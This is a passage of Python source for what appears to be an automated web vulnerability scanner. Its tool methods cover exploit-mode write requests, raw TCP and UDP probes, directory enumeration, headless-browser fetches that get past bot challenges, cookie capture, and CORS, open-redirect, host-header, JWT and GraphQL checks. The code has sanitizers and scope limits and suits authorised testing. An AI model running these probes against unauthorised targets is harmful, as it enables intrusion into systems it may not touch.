        status = resp.get("status")
        rbody = str(resp.get("body") or "")
        low = rbody.lower()
        rh_blob = " ".join(f"{k}: {v}" for k, v in (resp.get("headers") or {}).items())

        signals: list[str] = []
        if expect_marker and (expect_marker in rbody or expect_marker in rh_blob):
            signals.append("expect_marker_reflected")
        if status and int(status) >= 500:
            signals.append("server_error")
        if "sql" in low and any(x in low for x in ("syntax", "mysql", "postgresql", "odbc")):
            signals.append("sql_error_leak")
        if any(x in low for x in ("stack trace", "traceback", "exception in", "at com.", "at org.")):
            signals.append("stack_trace_leak")
        # A write method that the server ACCEPTS (2xx) is itself a signal on an authorized target.
        if method in ("PUT", "PATCH", "DELETE", "POST") and status and 200 <= int(status) < 300:
            signals.append(f"{method.lower()}_accepted")

        vuln_classes = {"expect_marker_reflected", "server_error", "sql_error_leak",
                        "stack_trace_leak", "put_accepted", "patch_accepted", "delete_accepted"}
        vulnerable = bool(vuln_classes.intersection(signals))

        data = {
            **resp, "method": method, "path": path, "exploit_mode": True,
            "body_sent": (body[:400] if body else None), "expect_marker": expect_marker or None,
            "proof_signals": signals, "vulnerable_signal": vulnerable,
        }
        if resp.get("error"):
            tr = ToolResult(False, oid, "exploit_request", f"{method} {path} → {resp['error']}",
                            data=data, error=str(resp["error"]), network=True)
        else:
            sig = f" signals={signals}" if signals else ""
            tr = ToolResult(True, oid, "exploit_request",
                            f"EXPLOIT {method} {path} → HTTP {status}{sig}", data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _raw_tcp(self, args: dict) -> ToolResult:
        oid = self._oid()
        raw = san.safe_raw_payload(args.get("payload") or args.get("data"))
        if raw is None:
            return ToolResult(False, oid, "raw_tcp", "invalid payload", error="sanitize failed")
        # Extra safety: refuse obvious destructive strings even on raw TCP
        try:
            text = raw.decode("utf-8", errors="replace")
            bad, reason = san.is_destructive_payload(text)
            if bad:
                return ToolResult(
                    False, oid, "raw_tcp", f"blocked: {reason}",
                    error=reason, network=False,
                    data={"blocked": True, "reason": reason},
                )
        except Exception:  # noqa: BLE001
            pass
        port = san.safe_port(args.get("port"), self.port)
        timeout = san.safe_timeout(args.get("timeout"), 5.0)
        from src.verifier.runner import _tcp_send_recv  # noqa: PLC0415
        resp, elapsed, err = _tcp_send_recv(self.host, port, raw, timeout=timeout, use_tls=False)
        data = {"elapsed_ms": elapsed, "error": err,
                "response": (resp.decode("utf-8", "replace")[:1500] if resp else "")}
        ok = not err and resp is not None
        nbytes = len(resp) if resp else 0
        tr = ToolResult(ok, oid, "raw_tcp",
                        f"tcp :{port} → {err or f'{nbytes} bytes'}",
                        data=data, error=err, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _udp_probe(self, args: dict) -> ToolResult:
        """Read-only UDP send/recv (discovery/query only — no application writes)."""
        from src.ip_scope import reply_from_target  # noqa: PLC0415

        oid = self._oid()
        port = san.safe_port(args.get("port"), 1900)
        timeout = san.safe_timeout(args.get("timeout"), 3.0)
        raw = san.safe_raw_payload(args.get("payload") or args.get("data"))
        if raw is None:
            # Default: empty probe / newline — still a query, not a write protocol
            raw = b"\r\n"
        import socket  # noqa: PLC0415
        t0 = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            try:
                sock.sendto(raw, (self.host, port))
                # Drain until a reply is attributable to the target (skip LAN noise).
                deadline = time.time() + timeout
                data = addr = None
                ignored: list[str] = []
                while time.time() < deadline:
                    try:
                        sock.settimeout(max(0.05, deadline - time.time()))
                        chunk, src = sock.recvfrom(4096)
                    except socket.timeout:
                        break
                    if reply_from_target(src[0], self.host):
                        data, addr = chunk, src
                        break
                    ignored.append(f"{src[0]}:{src[1]}")
                elapsed = (time.time() - t0) * 1000
                if data is None or addr is None:
                    tr = ToolResult(
                        False, oid, "udp_probe",
                        f"udp :{port} → no in-scope reply"
                        + (f" (ignored off-target: {', '.join(ignored[:3])})" if ignored else " (timeout)"),
                        data={"elapsed_ms": elapsed, "port": port,
                              "ignored_sources": ignored[:8],
                              "note": "replies must come from the scan target IP"},
                        error="no in-scope reply" if ignored else "timeout",
                        network=True,
                    )
                else:
                    text = data.decode("utf-8", "replace")[:2000]
                    tr = ToolResult(
                        True, oid, "udp_probe",
                        f"udp :{port} → {len(data)} bytes from {addr[0]}",
                        data={"elapsed_ms": elapsed, "from": f"{addr[0]}:{addr[1]}",
                              "response": text, "port": port,
                              "ignored_sources": ignored[:8]},
                        network=True,
                    )
            finally:
                sock.close()
        except socket.timeout:
            elapsed = (time.time() - t0) * 1000
            tr = ToolResult(False, oid, "udp_probe", f"udp :{port} → timeout",
                            data={"elapsed_ms": elapsed, "port": port},
                            error="timeout", network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "udp_probe", f"udp :{port} → {exc}",
                            error=str(exc)[:200], network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _ssdp_discover(self, args: dict) -> ToolResult:
        """SSDP M-SEARCH only — device discovery, no configuration changes.

        Replies are attributed to the target ONLY when the source IP matches the
        scan host (or its resolved addresses). LAN UPnP gateways (e.g. 192.168.0.1)
        answering a unicast send are recorded as ignored noise, not findings.
        """
        from src.ip_scope import reply_from_target  # noqa: PLC0415

        oid = self._oid()
        port = san.safe_port(args.get("port"), 1900)
        timeout = san.safe_timeout(args.get("timeout"), 3.0)
        import socket  # noqa: PLC0415
        t0 = time.time()
        replies: list[str] = []
        ignored: list[str] = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            try:
                # Unicast M-SEARCH to the target (scan of one host, not LAN flood)
                sock.sendto(_SSDP_MSEARCH, (self.host, port))
                deadline = time.time() + timeout
                while time.time() < deadline:
                    try:
                        sock.settimeout(max(0.1, deadline - time.time()))
                        data, addr = sock.recvfrom(4096)
                        src_ip, src_port = addr[0], addr[1]
                        body = data.decode("utf-8", "replace")[:800]
                        if not reply_from_target(src_ip, self.host):
                            ignored.append(f"{src_ip}:{src_port}")
                            continue
                        replies.append(f"from {src_ip}:{src_port}\n{body}")
                        if len(replies) >= 5:
                            break
                    except socket.timeout:
                        break
            finally:
                sock.close()
            elapsed = (time.time() - t0) * 1000
            ok = bool(replies)
            if ok:
                summary = f"ssdp :{port} → {len(replies)} reply(ies) from target"
            elif ignored:
                summary = (
                    f"ssdp :{port} → no target reply "
                    f"(ignored {len(ignored)} off-target/LAN source(s))"
                )
            else:
                summary = f"ssdp :{port} → no reply"
            tr = ToolResult(
                ok, oid, "ssdp_discover", summary,
                data={
                    "elapsed_ms": elapsed, "port": port, "replies": replies,
                    "ignored_sources": ignored[:12],
                    "note": "M-SEARCH discovery only; source IP must match target",
                },
                error="" if ok else ("off-target/LAN noise only" if ignored else "no reply"),
                network=True,
            )
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "ssdp_discover", str(exc),
                            error=str(exc)[:200], network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _tls_inspect(self, args: dict) -> ToolResult:
        oid = self._oid()
        port = san.safe_port(args.get("port"), 443 if self.tls else self.port)
        try:
            from src.tls_analyzer import probe_protocols  # noqa: PLC0415
            supported, deprecated = probe_protocols(self.host, port)
            data = {"protocols": supported, "deprecated": deprecated}
            ok = bool(supported or deprecated)
            tr = ToolResult(ok, oid, "tls_inspect",
                            f"TLS :{port} supported={','.join(supported or [])}",
                            data=data, network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "tls_inspect", str(exc), error=str(exc), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _dns_lookup(self, args: dict) -> ToolResult:
        oid = self._oid()
        try:
            from src.dns_security import check_spf  # noqa: PLC0415
            spf = check_spf(self.host)
            record = getattr(spf, "record", "") or ""
            data = {"spf": record, "host": self.host}
            tr = ToolResult(True, oid, "dns_lookup",
                            f"SPF: {record[:80]}" if record else "no SPF",
                            data=data, network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "dns_lookup", str(exc), error=str(exc), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _confirm_tech(self, args: dict) -> ToolResult:
        oid = self._oid()
        tech = san.safe_tech_slug(args.get("tech") or args.get("name"))
        if not tech:
            return ToolResult(False, oid, "confirm_tech", "invalid tech", error="sanitize failed")
        from src.reasoning.active_validation import _probe_for_candidate  # noqa: PLC0415
        probe = _probe_for_candidate(tech)
        if probe is None:
            # Fallback: GET / and look for tech name in headers/body
            path, markers = "/", (tech,)
        else:
            path, markers = probe.path, probe.markers
        resp = self._do_http("GET", path, {}, None, self.port, self.tls, 5.0)
        blob = ""
        if not resp.get("error"):
            hdrs = "\n".join(f"{k}: {v}" for k, v in (resp.get("headers") or {}).items())
            blob = f"{hdrs}\n\n{resp.get('body') or ''}".lower()
        hit = next((m for m in markers if m and m.lower() in blob), "")
        ok = bool(hit) and not resp.get("error")
        data = {**resp, "tech": tech, "marker": hit, "path": path}
        tr = ToolResult(ok, oid, "confirm_tech",
                        f"confirm {tech}: {'HIT '+hit if hit else 'no marker'}",
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _timing_probe(self, args: dict) -> ToolResult:
        oid = self._oid()
        path_a = san.safe_path(args.get("path_a") or args.get("path") or "/")
        path_b = san.safe_path(args.get("path_b") or path_a or "/")
        ha = san.safe_headers(args.get("headers_a")) or {}
        hb = san.safe_headers(args.get("headers_b")) or {}
        if path_a is None or path_b is None:
            return ToolResult(False, oid, "timing_probe", "invalid path", error="sanitize failed")
        ra = self._do_http("GET", path_a, ha, None, self.port, self.tls, 8.0)
        rb = self._do_http("GET", path_b, hb, None, self.port, self.tls, 8.0)
        da = float(ra.get("elapsed_ms") or 0)
        db = float(rb.get("elapsed_ms") or 0)
        delta = abs(da - db)
        data = {"a": ra, "b": rb, "delta_ms": delta}
        tr = ToolResult(True, oid, "timing_probe",
                        f"timing Δ={delta:.0f}ms (a={da:.0f} b={db:.0f})",
                        data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _dir_enum(self, args: dict) -> ToolResult:
        """GET-only path enumeration from a built-in wordlist. Never writes."""
        oid = self._oid()
        wl = san.safe_wordlist_name(args.get("wordlist") or args.get("list") or "common")
        paths = list(_DIR_LISTS.get(wl) or _DIR_LISTS["common"])
        try:
            max_paths = int(args.get("max_paths") or 40)
        except (TypeError, ValueError):
            max_paths = 40
        max_paths = max(5, min(max_paths, 60))
        paths = paths[:max_paths]
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 4.0)

        hits: list[dict] = []
        challenge = 0
        checked = 0
        for path in paths:
            checked += 1
            resp = self._do_http("GET", path, {}, None, port, tls, timeout)
            status = resp.get("status")
            body = (resp.get("body") or "")[:200]
            hdrs = resp.get("headers") or {}
            mitigated = str(hdrs.get("x-vercel-mitigated") or hdrs.get("X-Vercel-Mitigated") or "")
            if "challenge" in mitigated.lower() or "Security Checkpoint" in body:
                challenge += 1
            # Interesting: not vanilla 404 / connection fail
            if resp.get("error"):
                continue
            if status in (200, 201, 204, 301, 302, 307, 308, 401, 403, 500):
                # Skip boring global challenge-only 403s after a few samples
                if status == 403 and challenge >= 3 and "challenge" in mitigated.lower():
                    continue
                hits.append({
                    "path": path, "status": status,
                    "server": hdrs.get("server") or hdrs.get("Server") or "",
                    "location": hdrs.get("location") or hdrs.get("Location") or "",
                    "challenge": bool(mitigated),
                })
            if len(hits) >= 25:
                break

        summary = (
            f"dir_enum[{wl}]: {len(hits)} interesting / {checked} checked"
            + (f" (waf/challenge×{challenge})" if challenge else "")
        )
        tr = ToolResult(
            True, oid, "dir_enum", summary,
            data={"wordlist": wl, "checked": checked, "hits": hits,
                  "challenge_responses": challenge,
                  "note": "GET-only path probe — no writes"},
            network=True,
        )
        self.observations.append(tr.to_dict())
        return tr

    def _set_session(self, args: dict) -> ToolResult:
        """Attach cookies/headers for subsequent READ requests (scanner-side only)."""
        oid = self._oid()
        cookies = san.safe_cookies(args.get("cookies"))
        headers = san.safe_headers(args.get("headers"))
        if cookies is None or headers is None:
            return ToolResult(False, oid, "set_session", "invalid cookies/headers",
                              error="sanitize failed", network=False)
        # Only allow auth-ish headers — not Host / Content-Length
        allowed_h = {}
        for k, v in headers.items():
            kl = k.lower()
            if kl in ("authorization", "cookie", "x-api-key", "x-auth-token",
                      "x-csrf-token", "x-session-id", "x-requested-with"):
                allowed_h[k] = v
        self._session_cookies.update(cookies)
        self._session_headers.update(allowed_h)
        tr = ToolResult(
            True, oid, "set_session",
            f"session set ({len(self._session_cookies)} cookies, "
            f"{len(self._session_headers)} headers)",
            data={"cookies": list(self._session_cookies.keys()),
                  "headers": list(self._session_headers.keys()),
                  "note": "used only on outbound GETs — does not modify target data"},
            network=False,
        )
        return tr

    def _clear_session(self, args: dict) -> ToolResult:
        oid = self._oid()
        self._session_cookies.clear()
        self._session_headers.clear()
        return ToolResult(True, oid, "clear_session", "session cleared",
                          data={}, network=False)

    def _browser_get(self, args: dict) -> ToolResult:
        """Headless browser GET — may pass JS challenges; never submits forms or mutates data."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/") or "/"
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 15.0)
        try:
            wait_ms = int(args.get("wait_ms") or 2500)
        except (TypeError, ValueError):
            wait_ms = 2500
        wait_ms = max(0, min(wait_ms, 10000))

        scheme = "https" if tls or port in (443, 8443) else "http"
        netloc = self.host if port in (80, 443) else f"{self.host}:{port}"
        url = f"{scheme}://{netloc}{path}"

        try:
            from playwright.sync_api import sync_playwright  # noqa: PLC0415
        except ImportError:
            tr = ToolResult(
                False, oid, "browser_get",
                "playwright not installed — cannot solve JS challenges",
                error="playwright missing", network=False,
            )
            self.observations.append(tr.to_dict())
            return tr

        t0 = time.time()
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                try:
                    context = browser.new_context(ignore_https_errors=True)
                    # Seed scanner session into browser
                    if self._session_cookies:
                        context.add_cookies([
                            {"name": k, "value": v, "domain": self.host, "path": "/"}
                            for k, v in self._session_cookies.items()
                        ])
                    page = context.new_page()
                    page.set_extra_http_headers(dict(self._session_headers))
                    page.goto(url, wait_until="domcontentloaded",
                              timeout=int(timeout * 1000))
                    if wait_ms:
                        page.wait_for_timeout(wait_ms)
                    title = page.title() or ""
                    content = page.content() or ""
                    final_url = page.url or url
                    status = None
                    # Best-effort status from performance API is unreliable; detect challenge by body
                    cookies = {c["name"]: c["value"] for c in context.cookies()}
                    # Persist any new cookies for subsequent raw GETs
                    if cookies:
                        self._session_cookies.update(
                            {k: v for k, v in cookies.items() if k and v}
                        )
                    challenge = (
                        "Security Checkpoint" in content
                        or "x-vercel-mitigated" in content.lower()
                        or "cf-browser-verification" in content.lower()
                    )
                    elapsed = (time.time() - t0) * 1000
                    snippet = content[:2500]
                    tr = ToolResult(
                        True, oid, "browser_get",
                        f"browser GET {path} → {final_url[:80]}"
                        + (" [challenge page]" if challenge else f" title={title[:40]!r}"),
                        data={
                            "url": url, "final_url": final_url, "title": title[:200],
                            "elapsed_ms": elapsed, "challenge_page": challenge,
                            "cookies_captured": list(cookies.keys())[:20],
                            "body": snippet,
                            "note": "read-only browser GET — no form submit / no writes",
                        },
                        network=True,
                    )
                finally:
                    browser.close()
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(
                False, oid, "browser_get", f"browser_get failed: {exc}",
                error=str(exc)[:240], network=True,
            )
        self.observations.append(tr.to_dict())
        return tr

    # ── Tier A tools ─────────────────────────────────────────────────────────

    def _param_reflect(self, args: dict) -> ToolResult:
        """GET with unique marker in a query param — detect reflection / open redirect."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "param_reflect", "invalid path", error="sanitize failed")
        param = str(args.get("param") or "q").strip()[:40] or "q"
        # Keep param name safe (no injection into request line)
        import re as _re  # noqa: PLC0415
        if not _re.match(r"^[A-Za-z0-9_.-]{1,40}$", param):
            return ToolResult(False, oid, "param_reflect", "invalid param name", error="sanitize failed")
        marker = _REFLECT_MARKER
        # External-looking redirect target (for Location checks)
        ext = f"https://{marker}.invalid/"
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        # Two probes: simple reflect + redirect-style value
        sep = "&" if "?" in path else "?"
        path_reflect = f"{path}{sep}{param}={marker}"
        path_redir = f"{path}{sep}{param}={ext}"
        r1 = self._do_http("GET", path_reflect, {}, None, port, tls, 5.0)
        r2 = self._do_http("GET", path_redir, {}, None, port, tls, 5.0)
        body1 = str(r1.get("body") or "")
        hdrs1 = {str(k).lower(): str(v) for k, v in (r1.get("headers") or {}).items()}
        hdrs2 = {str(k).lower(): str(v) for k, v in (r2.get("headers") or {}).items()}
        loc2 = hdrs2.get("location") or ""
        reflected = marker in body1 or marker in str(hdrs1)
        # CWE-601: Location destination host must be external (not same-site echo
        # of the marker in a query string, e.g. HTTPS upgrade keeping host).
        try:
            from src.vuln_prober import is_external_open_redirect  # noqa: PLC0415
            open_redirect = is_external_open_redirect(loc2, self.host, marker)
        except Exception:  # noqa: BLE001
            # Fail closed: only signal if Location host literally is the marker domain.
            open_redirect = False
            try:
                from urllib.parse import urlparse as _up  # noqa: PLC0415
                _lh = (_up(loc2 if "://" in loc2 else f"https:{loc2}").hostname or "").lower()
                open_redirect = bool(_lh and marker.lower() in _lh and _lh != self.host.lower())
            except Exception:  # noqa: BLE001
                open_redirect = False
        data = {
            "param": param, "marker": marker,
            "reflected_in_body": marker in body1,
            "reflected_in_headers": any(marker in v for v in hdrs1.values()),
            "open_redirect_signal": open_redirect,
            "location": loc2[:300],
            "status_reflect": r1.get("status"), "status_redirect": r2.get("status"),
            "elapsed_ms": (r1.get("elapsed_ms") or 0) + (r2.get("elapsed_ms") or 0),
        }
        bits = []
        if data["reflected_in_body"] or data["reflected_in_headers"]:
            bits.append("REFLECTED")
        if open_redirect:
            bits.append("OPEN_REDIRECT_SIGNAL")
        summary = f"param_reflect {param}: " + (", ".join(bits) if bits else "no reflection")
        tr = ToolResult(True, oid, "param_reflect", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _cors_probe(self, args: dict) -> ToolResult:
        """Probe CORS with a foreign Origin — report ACAO/ACAC/Vary."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "cors_probe", "invalid path", error="sanitize failed")
        origin = str(args.get("origin") or "https://evil.example").strip()[:120]
        if not origin.startswith("http://") and not origin.startswith("https://"):
            origin = "https://evil.example"
        # Block CR/LF in Origin
        if any(c in origin for c in "\r\n"):
            origin = "https://evil.example"
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        headers = {"Origin": origin}
        resp = self._do_http("GET", path, headers, None, port, tls, 5.0)
        rh = {str(k).lower(): str(v) for k, v in (resp.get("headers") or {}).items()}
        acao = rh.get("access-control-allow-origin") or ""
        acac = (rh.get("access-control-allow-credentials") or "").lower()
        misconfig = False
        reasons = []
        if acao == "*":
            misconfig = True
            reasons.append("ACAO=*")
        if acao == origin:
            misconfig = True
            reasons.append("ACAO reflects foreign Origin")
        if acao == origin and acac == "true":
            reasons.append("ACAC=true with reflected Origin (credentialed CORS)")
            misconfig = True
        data = {
            "origin_sent": origin,
            "acao": acao, "acac": acac,
            "acah": rh.get("access-control-allow-headers") or "",
            "acam": rh.get("access-control-allow-methods") or "",
            "vary": rh.get("vary") or "",
            "misconfig_signal": misconfig,
            "reasons": reasons,
            "status": resp.get("status"),
            "elapsed_ms": resp.get("elapsed_ms"),
            "error": resp.get("error") or "",
        }
        summary = (
            f"cors_probe: MISCONFIG ({', '.join(reasons)})" if misconfig
            else f"cors_probe: ACAO={acao or '∅'} ACAC={acac or '∅'}"
        )
        tr = ToolResult(not bool(resp.get("error")), oid, "cors_probe", summary,
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _header_injection_probe(self, args: dict) -> ToolResult:
        """Observe Host / X-Forwarded-* handling — no CRLF smuggling payloads."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "header_injection_probe", "invalid path",
                              error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        # Baseline
        base = self._do_http("GET", path, {}, None, port, tls, 5.0)
        # Foreign Host (may be ignored / 400 / virtual-host switch)
        host_probe = self._do_http(
            "GET", path, {"Host": "nlprobe.invalid"}, None, port, tls, 5.0)
        # X-Forwarded-Host / X-Forwarded-For observation
        xfh = self._do_http(
            "GET", path,
            {"X-Forwarded-Host": "nlprobe.invalid", "X-Forwarded-For": "1.2.3.4"},
            None, port, tls, 5.0,
        )
        def _pack(r: dict) -> dict:
            hdrs = {str(k).lower(): str(v)[:200] for k, v in (r.get("headers") or {}).items()}
            return {
                "status": r.get("status"), "error": r.get("error") or "",
                "location": hdrs.get("location") or "",
                "server": hdrs.get("server") or "",
                "body_snip": str(r.get("body") or "")[:200],
                "elapsed_ms": r.get("elapsed_ms"),
            }
        base_p, host_p, xfh_p = _pack(base), _pack(host_probe), _pack(xfh)
        signals = []
        if host_p["status"] and base_p["status"] and host_p["status"] != base_p["status"]:
            signals.append("host_header_status_diff")
        if "nlprobe.invalid" in (host_p["location"] + host_p["body_snip"] + xfh_p["location"] + xfh_p["body_snip"]):
            signals.append("host_reflection")
        if host_p["location"] and host_p["location"] != base_p["location"]:
            signals.append("host_affects_location")
        data = {
            "baseline": base_p, "foreign_host": host_p, "x_forwarded": xfh_p,
            "signals": signals,
        }
        summary = (
            f"header_injection_probe: {', '.join(signals)}" if signals
            else "header_injection_probe: no host-header anomaly"
        )
        tr = ToolResult(True, oid, "header_injection_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _auth_flow_probe(self, args: dict) -> ToolResult:
        """GET login surfaces; capture Set-Cookie for scanner-side session only."""
        oid = self._oid()
        custom = args.get("path")
        paths: list[str] = []
        if custom:
            p = san.safe_path(custom)
            if p:
                paths.append(p)
        paths.extend(list(_AUTH_PATHS))
        # dedupe preserve order
        seen_paths: set[str] = set()
        uniq_paths: list[str] = []
        for p in paths:
            if p not in seen_paths:
                seen_paths.add(p)
                uniq_paths.append(p)
        paths = uniq_paths
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        hits = []
        cookies_found: dict[str, str] = {}
        for path in paths[:12]:
            resp = self._do_http("GET", path, {}, None, port, tls, 5.0)
            status = resp.get("status")
            body = str(resp.get("body") or "")
            hdrs = resp.get("headers") or {}
            # Parse Set-Cookie names (values stored scanner-side if present)
            sc = hdrs.get("Set-Cookie") or hdrs.get("set-cookie") or ""
            if isinstance(sc, list):
                sc_list = sc
            else:
                sc_list = [sc] if sc else []
            for raw_c in sc_list:
                if not isinstance(raw_c, str) or "=" not in raw_c:
                    continue
                name = raw_c.split(";", 1)[0].split("=", 1)[0].strip()
                val = raw_c.split(";", 1)[0].split("=", 1)[-1].strip()
                if name and val and name not in cookies_found:
                    cookies_found[name] = val[:200]
            looks_login = any(
                k in body.lower() for k in ("password", "type=\"password\"", "name=\"pass", "signin", "log in")
            )
            if status and int(status) < 500 and (looks_login or (status in (200, 302, 401, 403) and path != "/")):
                hits.append({
                    "path": path, "status": status, "login_form_signal": looks_login,
                    "set_cookie_names": list(cookies_found.keys())[:10],
                    "location": (hdrs.get("Location") or hdrs.get("location") or "")[:200],
                })
        # Apply first cookies to scanner session for subsequent reads
        if cookies_found:
            self._session_cookies.update(
                {k: v for k, v in list(cookies_found.items())[:12]}
            )
        data = {
            "hits": hits[:10],
            "cookies_captured": list(cookies_found.keys())[:12],
            "session_updated": bool(cookies_found),
            "note": "GET only; cookies applied scanner-side for later READs",
        }
        summary = (
            f"auth_flow_probe: {len(hits)} surface(s), cookies={list(cookies_found.keys())[:4]}"
            if hits or cookies_found else "auth_flow_probe: no login surface found"
        )
        tr = ToolResult(True, oid, "auth_flow_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _jwt_inspect(self, args: dict) -> ToolResult:
        """Decode JWT header/payload (no signature verification)."""
        import base64  # noqa: PLC0415
        import json as _json  # noqa: PLC0415
        import re as _re  # noqa: PLC0415

        oid = self._oid()
        token = args.get("token") or args.get("jwt")
        if not token:
            # from session cookies / Authorization
            name = str(args.get("from_cookie") or "").strip()
            if name and name in self._session_cookies:
                token = self._session_cookies[name]
            else:
                auth = self._session_headers.get("Authorization") or self._session_headers.get("authorization") or ""
                if auth.lower().startswith("bearer "):
                    token = auth.split(" ", 1)[1].strip()
                else:
                    # search cookie values for JWT shape
                    for v in self._session_cookies.values():
                        if isinstance(v, str) and v.count(".") >= 2 and len(v) > 20:
                            token = v
                            break
        if not isinstance(token, str) or token.count(".") < 2:
            return ToolResult(False, oid, "jwt_inspect", "no JWT found",
                              error="no token", network=False)

        def _b64url(part: str) -> dict | None:
            try:
                pad = "=" * (-len(part) % 4)
                raw = base64.urlsafe_b64decode(part + pad)
                return _json.loads(raw.decode("utf-8", "replace"))
            except Exception:
                return None

        parts = token.strip().split(".")
        header = _b64url(parts[0]) or {}
        payload = _b64url(parts[1]) or {}
        alg = str(header.get("alg") or "")
        flags = []
        if alg.lower() == "none":
            flags.append("alg_none")
        if alg.upper() in ("HS256", "HS384", "HS512"):
            flags.append("hmac_alg")
        if not header.get("kid") and alg:
            flags.append("no_kid")
        # Redact obvious secrets in payload for storage
        redacted = {}
        for k, v in list(payload.items())[:40]:
            ks = str(k).lower()
            if any(s in ks for s in ("pass", "secret", "token", "key", "session")):
                redacted[k] = "[redacted]"
            else:
                redacted[k] = v if not isinstance(v, str) or len(v) < 120 else v[:120] + "…"
        data = {
            "alg": alg,
            "header": {k: header[k] for k in list(header)[:20]},
            "claims": redacted,
            "flags": flags,
            "note": "decode only — signature NOT verified",
        }
        summary = f"jwt_inspect: alg={alg or '?'} flags={flags or ['ok']}"
        tr = ToolResult(True, oid, "jwt_inspect", summary, data=data, network=False)
        self.observations.append(tr.to_dict())
        return tr

    def _graphql_introspect(self, args: dict) -> ToolResult:
        """POST fixed introspection query — detect schema leak."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/graphql")
        if path is None:
            return ToolResult(False, oid, "graphql_introspect", "invalid path",
                              error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        resp = self._do_http(
            "POST", path, headers, _GRAPHQL_INTROSPECTION, port, tls, 8.0, allow_post=True,
        )
        body = str(resp.get("body") or "")
        schema_leak = False
        type_names: list[str] = []
        if "\"__schema\"" in body or "'__schema'" in body or "__schema" in body:
            schema_leak = True
            import re as _re  # noqa: PLC0415
            type_names = _re.findall(r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_]{0,64})"', body)[:40]
        data = {
            "path": path, "status": resp.get("status"), "error": resp.get("error") or "",
            "schema_leak": schema_leak,
            "type_names_sample": type_names[:20],
            "body_snip": body[:500],
            "elapsed_ms": resp.get("elapsed_ms"),
            "note": "fixed introspection query only — not free-form GraphQL",
        }
        summary = (
            f"graphql_introspect: SCHEMA LEAK ({len(type_names)} type names)"
            if schema_leak else f"graphql_introspect: status={resp.get('status')} no schema"
        )
        tr = ToolResult(not bool(resp.get("error")), oid, "graphql_introspect", summary,
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _api_discover(self, args: dict) -> ToolResult:
        """Fetch robots/OpenAPI/common doc paths; extract path hints."""
        import re as _re  # noqa: PLC0415

        oid = self._oid()
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        found = []
        paths_hint: list[str] = []
        for path in _API_DISCOVER_PATHS:
            resp = self._do_http("GET", path, {}, None, port, tls, 4.0)
            status = resp.get("status")
            body = str(resp.get("body") or "")
            if not status or status >= 400:
                continue
            entry = {"path": path, "status": status, "bytes": len(body)}
            if path.endswith("robots.txt"):
                for line in body.splitlines()[:80]:
                    line = line.strip()
                    if line.lower().startswith("disallow:") or line.lower().startswith("allow:"):
                        p = line.split(":", 1)[-1].strip()
                        if p.startswith("/"):
                            paths_hint.append(p[:120])
            # OpenAPI-ish path extraction
            for m in _re.findall(r'["\'](/[A-Za-z0-9_.{}/-]{1,80})["\']', body)[:40]:
                if m.startswith("/") and not m.startswith("//"):
                    paths_hint.append(m)
            if "openapi" in body.lower() or "swagger" in body.lower() or path.endswith(".json"):
                entry["doc_signal"] = True
            found.append(entry)
        # unique paths
        uniq = list(dict.fromkeys(paths_hint))[:50]
        data = {"documents": found, "path_hints": uniq, "count": len(found)}
        summary = f"api_discover: {len(found)} doc(s), {len(uniq)} path hint(s)"
        tr = ToolResult(True, oid, "api_discover", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _s3_or_storage_probe(self, args: dict) -> ToolResult:
        """Find cloud storage URLs in a page body (report candidates; optional same-host HEAD)."""
        import re as _re  # noqa: PLC0415

        oid = self._oid()
        path = san.safe_path(args.get("path") or "/")
        if path is None:
            return ToolResult(False, oid, "s3_or_storage_probe", "invalid path",
                              error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        resp = self._do_http("GET", path, {}, None, port, tls, 6.0)
        body = str(resp.get("body") or "")
        # Full URLs
        url_re = _re.compile(
            r"https?://(" + _STORAGE_HOST_RE + r")(/[^\s\"'<>]*)?",
